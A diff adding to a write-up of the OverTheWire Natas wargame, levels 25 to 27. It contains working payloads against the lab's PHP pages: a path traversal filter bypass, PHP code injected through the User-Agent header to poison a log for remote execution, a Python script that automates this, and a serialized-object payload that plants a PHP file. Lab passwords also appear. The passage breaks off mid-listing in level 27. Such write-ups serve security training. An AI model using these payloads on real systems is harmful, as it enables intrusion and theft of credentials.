@@ -260,7 +260,7 @@ Cache-Control: max-age=0
 Authorization: Basic bmF0YXM1OjBuMzVQa2dnQVBtMnpiRXBPVTgwMmMweDBNc24xVG9L
 Accept-Language: en-GB
 Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
+User-Agent: [UNDISCLOSED]
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 Accept-Encoding: gzip, deflate, br
 Cookie: loggedin=0
@@ -875,7 +875,7 @@ Intercept a request:
 ```
 GET /?bgcolor=%23ffaaaa HTTP/1.1
 Host: natas11.natas.labs.overthewire.org
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0
+User-Agent: [UNDISCLOSED]
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
@@ -2394,7 +2394,7 @@ This is equivalent to sending twice (eg. with Burp) the following POST request:
 ```
 POST /index.php?debug HTTP/1.1
 Host: natas20.natas.labs.overthewire.org
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:131.0) Gecko/20100101 Firefox/131.0
+User-Agent: [UNDISCLOSED]
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
@@ -2799,7 +2799,7 @@ Trying with Burp. The request:
 ```
 GET /?revelio=1 HTTP/1.1
 Host: natas22.natas.labs.overthewire.org
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:131.0) Gecko/20100101 Firefox/131.0
+User-Agent: [UNDISCLOSED]
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
@@ -3103,6 +3103,1134 @@ Password:
 Username: natas25
 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
 URL: http://natas25.natas.labs.overthewire.org
+
+### Message
+
+There is a quote:
+
+> Quote
+>
+> You see, no one's going to help you Bubby, because there isn't anybody out there to do it. No one. We're all just complicated arrangements of atoms and subatomic particles - we don't live. But our atoms do move about in such a way as to give us identity and consciousness. We don't die; our atoms just rearrange themselves. There is no God. There can be no God; it's ridiculous to think in terms of a superior being. An inferior being, maybe, because we, we who don't even exist, we arrange our lives with more order and harmony than God ever arranged the earth. We measure; we plot; we create wonderful new things. We are the architects of our own existence. What a lunatic concept to bow down before a God who slaughters millions of innocent children, slowly and agonizingly starves them to death, beats them, tortures them, rejects them. What folly to even think that we should not insult such a God, damn him, think him out of existence. It is our duty to think God out of existence. It is our duty to insult him. Fuck you, God! Strike me down if you dare, you tyrant, you non-existent fraud! It is the duty of all human beings to think God out of existence. Then we have a future. Because then - and only then - do we take full responsibility for who we are. And that's what you must do, Bubby: think God out of existence; take responsibility for who you are.
+> Scientist, Bad Boy Bubby
+
+One can choose the language between English and German.
+
+> Zitat
+>
+> Weißt du, niemand wird dir helfen Bubby. Denn es gibt Niemand, der dazu vorgesehen ist. Niemand. Wir sind alle nur komplizierte Anordnungen von Atomen und subatomaren Teilchen. Wir leben nicht. Unsere atome bewegen sich in einer Art und Weise, die uns Identität und Bewustesein verleiht. Wir sterben auch nicht. Unsere Atome strukturieren sich nur um. Es gibt keinen Gott, es kann keinen Gott geben. Es ist lächerlich, in Kategorien eines höheren Wesens zu denken. Eines niedrigeren Wesens, das könnte es vielleicht geben. Weil wir, die wir nicht mal existieren, unser Leben mit mehr Ordnung und Harmonie gestalten, als Gott jemals die Erde gestaltet hat. Wir essen, wir planen, wir erschaffen wunderbare Musik. Wir sind die Architekten unserer eigenen Existenz. Was für eine idiotische Vorstellung, sich vor einem Gott zu verneigen, der Millionen unschuldiger Kinder abschlachten lässt. Der für ihren langsamen und qualvollen Hungertod verantwortlich ist. Der zusieht, wie sie geschlagen und gefoltert werden. Der sie abweist. Welche Dummheit, auch nur zu denken, dass wir einen solchen Gott nicht beleidigen dürfen. Verdammt nochmal! Leugnen wir doch einfach seine Existenz. Es ist unsere Pflicht, die Existenz Gottes zu leugnen. Es ist unsere Pflicht, ihn zu beleidigen. Leck mich am Arsch, Gott! Schlag mich nieder, wenn du dich traust, du Tyrann! Du nicht existierender Betrug. Es ist die Pflicht aller menschlichen Wesen, die Existenz Gottes zu verneinen. Dann haben wir eine Zukunft. Denn dann, und nur dann, übernehmen wir die volle Verantwortung für das, was wir sind. Und genau das musst du tun, Bubby. Denk Gottes Existenz einfach weg. Übernimm die Verantwortung für das, was du bist.
+> Wissenschaftler, Bad Boy Bubby
+
+There is a link to the source code.
+
+### Solution
+
+The source code linked is:
+
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas25", "pass": "<censored>" };</script></head>
+<body>
+<?php
+    // cheers and <3 to malvina
+    // - morla
+
+    function setLanguage(){
+        /* language setup */
+        if(array_key_exists("lang",$_REQUEST))
+            if(safeinclude("language/" . $_REQUEST["lang"] ))
+                return 1;
+        safeinclude("language/en");
+    }
+
+    function safeinclude($filename){
+        // check for directory traversal
+        if(strstr($filename,"../")){
+            logRequest("Directory traversal attempt! fixing request.");
+            $filename=str_replace("../","",$filename);
+        }
+        // dont let ppl steal our passwords
+        if(strstr($filename,"natas_webpass")){
+            logRequest("Illegal file access detected! Aborting!");
+            exit(-1);
+        }
+        // add more checks...
+
+        if (file_exists($filename)) {
+            include($filename);
+            return 1;
+        }
+        return 0;
+    }
+
+    function listFiles($path){
+        $listoffiles=array();
+        if ($handle = opendir($path))
+            while (false !== ($file = readdir($handle)))
+                if ($file != "." && $file != "..")
+                    $listoffiles[]=$file;
+
+        closedir($handle);
+        return $listoffiles;
+    }
+
+    function logRequest($message){
+        $log="[". date("d.m.Y H::i:s",time()) ."]";
+        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+        $log=$log . " \"" . $message ."\"\n";
+        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+        fwrite($fd,$log);
+        fclose($fd);
+    }
+?>
+
+<h1>natas25</h1>
+<div id="content">
+<div align="right">
+<form>
+<select name='lang' onchange='this.form.submit()'>
+<option>language</option>
+<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
+</select>
+</form>
+</div>
+
+<?php
+    session_start();
+    setLanguage();
+
+    echo "<h2>$__GREETING</h2>";
+    echo "<p align=\"justify\">$__MSG";
+    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
+?>
+<p>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+The PHP part:
+
+```php
+<?php
+    // cheers and <3 to malvina
+    // - morla
+
+    function setLanguage(){
+        /* language setup */
+        if(array_key_exists("lang",$_REQUEST))
+            if(safeinclude("language/" . $_REQUEST["lang"] ))
+                return 1;
+        safeinclude("language/en");
+    }
+
+    function safeinclude($filename){
+        // check for directory traversal
+        if(strstr($filename,"../")){
+            logRequest("Directory traversal attempt! fixing request.");
+            $filename=str_replace("../","",$filename);
+        }
+        // dont let ppl steal our passwords
+        if(strstr($filename,"natas_webpass")){
+            logRequest("Illegal file access detected! Aborting!");
+            exit(-1);
+        }
+        // add more checks...
+
+        if (file_exists($filename)) {
+            include($filename);
+            return 1;
+        }
+        return 0;
+    }
+
+    function listFiles($path){
+        $listoffiles=array();
+        if ($handle = opendir($path))
+            while (false !== ($file = readdir($handle)))
+                if ($file != "." && $file != "..")
+                    $listoffiles[]=$file;
+
+        closedir($handle);
+        return $listoffiles;
+    }
+
+    function logRequest($message){
+        $log="[". date("d.m.Y H::i:s",time()) ."]";
+        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+        $log=$log . " \"" . $message ."\"\n";
+        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+        fwrite($fd,$log);
+        fclose($fd);
+    }
+?>
+```
+
+The main page is `http://natas25.natas.labs.overthewire.org/`. Notice that setting the language as `de` redirects us to `http://natas25.natas.labs.overthewire.org/?lang=de`. Try the basic tampering method (that should fail according to the PHP code above): go to `http://natas25.natas.labs.overthewire.org/?lang=../`. This produces the error:
+
+> Warning: include(/var/www/natas/natas25/language): failed to open stream: No such file or directory in /var/www/natas/natas25/index.php on line 38
+>
+> Warning: include(): Failed opening 'language/' for inclusion (include_path='.:/usr/share/php') in /var/www/natas/natas25/index.php on line 38
+>
+> Notice: Undefined variable: \_\_GREETING in /var/www/natas/natas25/index.php on line 80
+>
+> Notice: Undefined variable: \_\_MSG in /var/www/natas/natas25/index.php on line 81
+>
+> Notice: Undefined variable: \_\_FOOTER in /var/www/natas/natas25/index.php on line 82
+
+We can try to bypass the `"../"` replacement with `""` requesting `http://natas25.natas.labs.overthewire.org/?lang=....//`.
+
+> Warning: include(/var/www/natas/natas25): failed to open stream: No such file or directory in /var/www/natas/natas25/index.php on line 38
+>
+> Warning: include(): Failed opening 'language/../' for inclusion (include_path='.:/usr/share/php') in /var/www/natas/natas25/index.php on line 38
+>
+> Notice: Undefined variable: \_\_GREETING in /var/www/natas/natas25/index.php on line 80
+>
+> Notice: Undefined variable: \_\_MSG in /var/www/natas/natas25/index.php on line 81
+>
+> Notice: Undefined variable: \_\_FOOTER in /var/www/natas/natas25/index.php on line 82
+
+Moreover, if we request `http://natas25.natas.labs.overthewire.org/?lang=....//....//....//`:
+
+> Warning: include(/var/www): failed to open stream: No such file or directory in /var/www/natas/natas25/index.php on line 38
+>
+> Warning: include(): Failed opening 'language/../../../' for inclusion (include_path='.:/usr/share/php') in /var/www/natas/natas25/index.php on line 38
+>
+> Notice: Undefined variable: \_\_GREETING in /var/www/natas/natas25/index.php on line 80
+>
+> Notice: Undefined variable: \_\_MSG in /var/www/natas/natas25/index.php on line 81
+>
+> Notice: Undefined variable: \_\_FOOTER in /var/www/natas/natas25/index.php on line 82
+
+Let's try if this technique actually works with a file: `http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//etc/passwd` correctly returns the `/etc/passwd` file!
+
+Try with `....//....//....//....//..../etc/natas_webpass/natas26`: the request to `http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//..../etc/natas_webpass/natas26` does not give any output. This was expected...
+
+Looking better at the PHP code:
+
+```php
+function logRequest($message){
+        $log="[". date("d.m.Y H::i:s",time()) ."]";
+        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+        $log=$log . " \"" . $message ."\"\n";
+        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+        fwrite($fd,$log);
+        fclose($fd);
+    }
+```
+
+Here there is a `fopen` function call... We need to know our session ID. Looging at the cookies, we can easily get it: there is a cookie called `PHPSESSID`, which, for example has the value: `04mg3fhcld4h0i63i2b500cjgo`.
+
+Request `http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....///var/www/natas/natas25/logs/natas25_04mg3fhcld4h0i63i2b500cjgo.log` and get:
+
+> [25.10.2024 04::56:32] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::00:19] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::00:19] [UNDISCLOSED] "Illegal file access detected! Aborting!" [25.10.2024 05::05:19] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::05:19] [UNDISCLOSED] "Illegal file access detected! Aborting!" [25.10.2024 05::05:33] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::05:33] [UNDISCLOSED] "Illegal file access detected! Aborting!" [25.10.2024 05::06:02] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::07:37] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::09:40] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::11:26] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::11:26] [UNDISCLOSED] "Illegal file access detected! Aborting!" [25.10.2024 05::16:34] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::17:46] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::17:52] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::18:06] [UNDISCLOSED] "Directory traversal attempt! fixing request."
+
+That is interesting.
+
+Moreover, the function `logRequest` writes in the log file the value of `$_SERVER['HTTP_USER_AGENT']`. Can we tamper it?
+
+Using Burp, the base request is:
+
+```
+GET /?lang=....//....//....//....//....///var/www/natas/natas25/logs/natas25_04mg3fhcld4h0i63i2b500cjgo.log HTTP/1.1
+Host: natas25.natas.labs.overthewire.org
+User-Agent: [UNDISCLOSED]
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Authorization: Basic bmF0YXMyNTpja0VMS1VXWlVmcE92NnV4UzZNN2xYQnBCc3NKWjRXcw==
+Connection: keep-alive
+Cookie: PHPSESSID=04mg3fhcld4h0i63i2b500cjgo
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Priority: u=0, i
+```
+
+We can execute system commands in PHP using `exec`, as [here](https://www.php.net/manual/en/function.exec.php) explained:
+
+```php
+<?php
+// outputs the username that owns the running php/httpd process
+// (on a system with the "whoami" executable in the path)
+$output=null;
+$retval=null;
+exec('whoami', $output, $retval);
+echo "Returned with status $retval and output:\n";
+print_r($output);
+?>
+```
+
+We replace the User Agent with `User-Agent: <?php echo exec('whoami');?>` getting:
+
+```
+GET /?lang=....//....//....//....//....///var/www/natas/natas25/logs/natas25_04mg3fhcld4h0i63i2b500cjgo.log HTTP/1.1
+Host: natas25.natas.labs.overthewire.org
+User-Agent: <?php echo exec('whoami');?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Authorization: Basic bmF0YXMyNTpja0VMS1VXWlVmcE92NnV4UzZNN2xYQnBCc3NKWjRXcw==
+Connection: keep-alive
+Cookie: PHPSESSID=04mg3fhcld4h0i63i2b500cjgo
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Priority: u=0, i
+```
+
+In the logs:
+
+```
+[25.10.2024 05::32:52] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE "Directory traversal attempt! fixing request."
+```
+
+When understood, this whole process can be automated in a script:
+
+```python
+import requests
+from requests.auth import HTTPBasicAuth
+
+basic_auth = HTTPBasicAuth('natas25', 'ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws')
+
+url = "http://natas25.natas.labs.overthewire.org/"
+
+
+def send_request() -> str:
+    first_url = url + f"?lang=de"
+    print(f"Sending request to [{first_url}]...")
+    user_agent = "<?php echo shell_exec('cat /etc/natas_webpass/natas26');?>"
+    headers = {'Content-Type': 'text/html; charset=UTF-8',
+               'User-Agent': user_agent}
+    session = requests.Session()
+    _ = session.get(first_url,
+                    headers=headers,
+                    auth=basic_auth,
+                    verify=False)
+    session_id = session.cookies.get_dict()['PHPSESSID']
+    second_url = url + \
+        f"?lang=....//....//....//....//....///var/www/natas/natas25/logs/natas25_{session_id}.log"
+    response = session.get(second_url,
+                           headers=headers,
+                           auth=basic_auth,
+                           verify=False)
+    return response.text
+
+
+if __name__ == '__main__':
+    print(send_request())
+```
+
+## Natas 26
+
+### Credentials
+
+Username: natas26
+Password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
+URL: http://natas26.natas.labs.overthewire.org
+
+### Message
+
+The page says:
+
+> Draw a line:
+
+and requires X1, Y1, X2, Y2.
+
+There is a link to the source code.
+
+### Solution
+
+The source code linked:
+
+```html
+<html>
+  <head>
+    <!-- This stuff in the header has nothing to do with the level -->
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="http://natas.labs.overthewire.org/css/level.css"
+    />
+    <link
+      rel="stylesheet"
+      href="http://natas.labs.overthewire.org/css/jquery-ui.css"
+    />
+    <link
+      rel="stylesheet"
+      href="http://natas.labs.overthewire.org/css/wechall.css"
+    />
+    <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+    <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+    <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script>
+    <script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+    <script>
+      var wechallinfo = { level: "natas26", pass: "<censored>" };
+    </script>
+  </head>
+  <body>
+    <?php
+    // sry, this is ugly as hell.
+    // cheers kaliman ;)
+    // - morla
+
+    class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+
+        function __construct($file){
+            // initialise variables
+            $this->initMsg="#--session started--#\n"; $this->exitMsg="#--session
+    end--#\n"; $this->logFile = "/tmp/natas26_" . $file . ".log"; // write
+    initial message $fd=fopen($this->logFile,"a+"); fwrite($fd,$this->initMsg);
+    fclose($fd); } function log($msg){ $fd=fopen($this->logFile,"a+");
+    fwrite($fd,$msg."\n"); fclose($fd); } function __destruct(){ // write exit
+    message $fd=fopen($this->logFile,"a+"); fwrite($fd,$this->exitMsg);
+    fclose($fd); } } function showImage($filename){ if(file_exists($filename))
+    echo "<img src=\"$filename\">"; } function drawImage($filename){
+    $img=imagecreatetruecolor(400,300); drawFromUserdata($img);
+    imagepng($img,$filename); imagedestroy($img); } function
+    drawFromUserdata($img){ if( array_key_exists("x1", $_GET) &&
+    array_key_exists("y1", $_GET) && array_key_exists("x2", $_GET) &&
+    array_key_exists("y2", $_GET)){
+    $color=imagecolorallocate($img,0xff,0x12,0x1c); imageline($img,$_GET["x1"],
+    $_GET["y1"], $_GET["x2"], $_GET["y2"], $color); } if
+    (array_key_exists("drawing", $_COOKIE)){
+    $drawing=unserialize(base64_decode($_COOKIE["drawing"])); if($drawing)
+    foreach($drawing as $object) if( array_key_exists("x1", $object) &&
+    array_key_exists("y1", $object) && array_key_exists("x2", $object) &&
+    array_key_exists("y2", $object)){
+    $color=imagecolorallocate($img,0xff,0x12,0x1c);
+    imageline($img,$object["x1"],$object["y1"], $object["x2"] ,$object["y2"]
+    ,$color); } } } function storeData(){ $new_object=array();
+    if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+    array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
+    $new_object["x1"]=$_GET["x1"]; $new_object["y1"]=$_GET["y1"];
+    $new_object["x2"]=$_GET["x2"]; $new_object["y2"]=$_GET["y2"]; } if
+    (array_key_exists("drawing", $_COOKIE)){
+    $drawing=unserialize(base64_decode($_COOKIE["drawing"])); } else{ // create
+    new array $drawing=array(); } $drawing[]=$new_object;
+    setcookie("drawing",base64_encode(serialize($drawing))); } ?>
+
+    <h1>natas26</h1>
+    <div id="content">
+      Draw a line:<br />
+      <form name="input" method="get">
+        X1<input type="text" name="x1" size="2" /> Y1<input
+          type="text"
+          name="y1"
+          size="2"
+        />
+        X2<input type="text" name="x2" size="2" /> Y2<input
+          type="text"
+          name="y2"
+          size="2"
+        />
+        <input type="submit" value="DRAW!" />
+      </form>
+
+      <?php
+    session_start();
+
+    if (array_key_exists("drawing", $_COOKIE) ||
+        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
+        $imgfile="img/natas26_" . session_id() .".png";
+        drawImage($imgfile);
+        showImage($imgfile);
+        storeData();
+    }
+
+?>
+
+      <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+    </div>
+  </body>
+</html>
+```
+
+In particular, the PHP part:
+
+```php
+<?php
+    // sry, this is ugly as hell.
+    // cheers kaliman ;)
+    // - morla
+
+    class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+
+        function __construct($file){
+            // initialise variables
+            $this->initMsg="#--session started--#\n";
+            $this->exitMsg="#--session end--#\n";
+            $this->logFile = "/tmp/natas26_" . $file . ".log";
+
+            // write initial message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->initMsg);
+            fclose($fd);
+        }
+
+        function log($msg){
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$msg."\n");
+            fclose($fd);
+        }
+
+        function __destruct(){
+            // write exit message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->exitMsg);
+            fclose($fd);
+        }
+    }
+
+    function showImage($filename){
+        if(file_exists($filename))
+            echo "<img src=\"$filename\">";
+    }
+
+    function drawImage($filename){
+        $img=imagecreatetruecolor(400,300);
+        drawFromUserdata($img);
+        imagepng($img,$filename);
+        imagedestroy($img);
+    }
+
+    function drawFromUserdata($img){
+        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
+
+            $color=imagecolorallocate($img,0xff,0x12,0x1c);
+            imageline($img,$_GET["x1"], $_GET["y1"],
+                            $_GET["x2"], $_GET["y2"], $color);
+        }
+
+        if (array_key_exists("drawing", $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+            if($drawing)
+                foreach($drawing as $object)
+                    if( array_key_exists("x1", $object) &&
+                        array_key_exists("y1", $object) &&
+                        array_key_exists("x2", $object) &&
+                        array_key_exists("y2", $object)){
+
+                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
+                        imageline($img,$object["x1"],$object["y1"],
+                                $object["x2"] ,$object["y2"] ,$color);
+
+                    }
+        }
+    }
+
+    function storeData(){
+        $new_object=array();
+
+        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
+            $new_object["x1"]=$_GET["x1"];
+            $new_object["y1"]=$_GET["y1"];
+            $new_object["x2"]=$_GET["x2"];
+            $new_object["y2"]=$_GET["y2"];
+        }
+
+        if (array_key_exists("drawing", $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+        }
+        else{
+            // create new array
+            $drawing=array();
+        }
+
+        $drawing[]=$new_object;
+        setcookie("drawing",base64_encode(serialize($drawing)));
+    }
+?>
+```
+
+and
+
+```php
+<?php
+    session_start();
+
+    if (array_key_exists("drawing", $_COOKIE) ||
+        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
+        $imgfile="img/natas26_" . session_id() .".png";
+        drawImage($imgfile);
+        showImage($imgfile);
+        storeData();
+    }
+
+?>
+```
+
+Inserting X1, Y1, X2 and Y2, the request goes to `http://natas26.natas.labs.overthewire.org/?x1=1&y1=1&x2=2&y2=2`. There is a cookie called `drawing` with value (e.g.) `YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjE6IjEiO3M6MjoieTEiO3M6MToiMSI7czoyOiJ4MiI7czoxOiIyIjtzOjI6InkyIjtzOjE6IjIiO319` and another called `PHPSESSID` with value `0o8fjas5n6i6f4l8jgipiegq9l`.
+
+Reading the code, notice in the function `drawFromUserdata`:
+
+```php
+if (array_key_exists("drawing", $_COOKIE)){
+    $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+    if($drawing)
+        foreach($drawing as $object)
+            if( array_key_exists("x1", $object) &&
+                array_key_exists("y1", $object) &&
+                array_key_exists("x2", $object) &&
+                array_key_exists("y2", $object)){
+
+                $color=imagecolorallocate($img,0xff,0x12,0x1c);
+                imageline($img,$object["x1"],$object["y1"],
+                        $object["x2"] ,$object["y2"] ,$color);
+
+            }
+}
+```
+
+Thus the cookie `drawing` is base 64 encoded data! Decode it using [CyberChef](https://cyberchef.org/) or the command `base64` and get:
+
+```
+YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjE6IjEiO3M6MjoieTEiO3M6MToiMSI7czoyOiJ4MiI7czoxOiIyIjtzOjI6InkyIjtzOjE6IjIiO319
+```
+
+is
+
+```
+a:1:{i:0;a:4:{s:2:"x1";s:1:"1";s:2:"y1";s:1:"1";s:2:"x2";s:1:"2";s:2:"y2";s:1:"2";}}
+```
+
+```php
+<?php
+
+class Logger {
+    private $logFile;
+    private $exitMsg;
+
+    function __construct() {
+        $this->exitMsg = "<?php echo exec('cat /etc/natas_webpass/natas27'); ?>";
+        $this->logFile = "/var/www/natas/natas26/img/natas26_[SESSION_ID].php";
+    }
+}
+
+$logger = new Logger();
+
+echo base64_encode(serialize($logger));
+?>
+```
+
+This produces base 64 encoded data.
+
+Replace the `drawing` cookie with this data and then visit `http://natas26.natas.labs.overthewire.org/img/natas26_[SESSION_ID].php`.
+
+Visit `http://natas26.natas.labs.overthewire.org/img/natas26_[SESSION_ID].php`.
+
+Given the session ID `rnhdh9ujn7qlaur1nf17umi8ec`,
+
+```php
+<?php
+
+class Logger {
+    private $logFile;
+    private $exitMsg;
+
+    function __construct() {
+        $this->exitMsg = "<?php echo exec('cat /etc/natas_webpass/natas27'); ?>";
+        $this->logFile = "/var/www/natas/natas26/img/natas26_rnhdh9ujn7qlaur1nf17umi8ec.php";
+    }
+}
+
+$logger = new Logger();
+
+echo base64_encode(serialize($logger));
+?>
+```
+
+This produces the output `Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo2NToiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbmF0YXMyNl9ybmhkaDl1am43cWxhdXIxbmYxN3VtaThlYy5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MzoiPD9waHAgZWNobyBleGVjKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30=`,
+which we set in `drawing`. Draw something specifying the coordinates as required.
+
+Visit `http://natas26.natas.labs.overthewire.org/img/natas26_rnhdh9ujn7qlaur1nf17umi8ec.php`.
+
+This gives the value `u3RRffXjysjgwFU6b9xa23i6prmUsYne`.
+
+## Natas 27
+
+### Credentials
+
+Username: natas27
+Password: u3RRffXjysjgwFU6b9xa23i6prmUsYne
+URL: http://natas27.natas.labs.overthewire.org
+
+### Message
+
+The page requires a username and a password.
+
+There is a link to the source code.
+
+### Solution
+
+Inserting a username and a password, a POST request is made to `http://natas27.natas.labs.overthewire.org/index.php` with body:
+
+```
+username=asd&password=dsa
+```
+
+It seems that this creates a user:
+
+> User asd was created!
+
+The page source code is the following:
+
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas27", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas27</h1>
+<div id="content">
+<?php
+
+// morla / 10111
+// database gets cleared every 5 min
+
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+
+function checkCredentials($link,$usr,$pass){
+
+    $user=mysqli_real_escape_string($link, $usr);
+    $password=mysqli_real_escape_string($link, $pass);
+
+    $query = "SELECT username from users where username='$user' and password='$password' ";
+    $res = mysqli_query($link, $query);
+    if(mysqli_num_rows($res) > 0){
+        return True;
+    }
+    return False;
+}
+
+
+function validUser($link,$usr){
+
+    $user=mysqli_real_escape_string($link, $usr);
+
+    $query = "SELECT * from users where username='$user'";
+    $res = mysqli_query($link, $query);
+    if($res) {
+        if(mysqli_num_rows($res) > 0) {
+            return True;
+        }
+    }
+    return False;
+}
+
+
+function dumpData($link,$usr){
+
+    $user=mysqli_real_escape_string($link, trim($usr));
+
+    $query = "SELECT * from users where username='$user'";
+    $res = mysqli_query($link, $query);
+    if($res) {
+        if(mysqli_num_rows($res) > 0) {
+            while ($row = mysqli_fetch_assoc($res)) {
+                // thanks to Gobo for reporting this bug!
+                //return print_r($row);
+                return print_r($row,true);
+            }
+        }
+    }
+    return False;
+}
+
+
+function createUser($link, $usr, $pass){
+
+    if($usr != trim($usr)) {
+        echo "Go away hacker";
+        return False;
+    }
+    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
+    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));
+
+    $query = "INSERT INTO users (username,password) values ('$user','$password')";
+    $res = mysqli_query($link, $query);
+    if(mysqli_affected_rows($link) > 0){
+        return True;
+    }
+    return False;
+}
+
+
